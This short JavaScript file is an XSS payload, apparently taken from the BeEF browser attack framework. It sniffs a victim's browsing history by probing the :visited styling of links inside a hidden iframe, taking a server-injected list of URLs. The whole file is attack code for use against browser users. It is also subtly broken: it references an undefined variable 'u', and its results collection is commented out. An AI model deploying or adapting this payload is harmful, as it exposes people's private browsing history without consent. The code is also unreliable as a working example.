// ripped from BEEF
// send urls in the "urls" parameter space separated
function check_urls(urls)
{
    var results = new Array();
    var iframe = xssce("iframe");
    var ifdoc = (iframe.contentDocument) ? iframe.contentDocument : iframe.contentWindow.document;
    ifdoc.open();
    ifdoc.write('<style>a:visited{width:0px !important;}</style>');
    ifdoc.close();

	// split the urls by space
    urls = urls.split(" ");

	xssdebug("testing #" + urls.length + " urls");
    for (var i in urls) {
        var url = urls[i];
        if (url) {
            var success = false;
            var a = xssce('a');
            a.href = u;
            ifdoc.body.appendChild(a);

            var width = "";
            (a.currentStyle) ? width = a.currentStyle['width'] : width = ifdoc.defaultView.getComputedStyle(a, null).getPropertyValue("width");
            if (width == '0px') {
                success = true;
				xssdebug(url + " visited");
            }
            //results.push({'url':u, 'visited':success});
        }
    }
	xssrm(iframe);
	xssdebug("finished");
}

check_urls("<?=$urls?>");
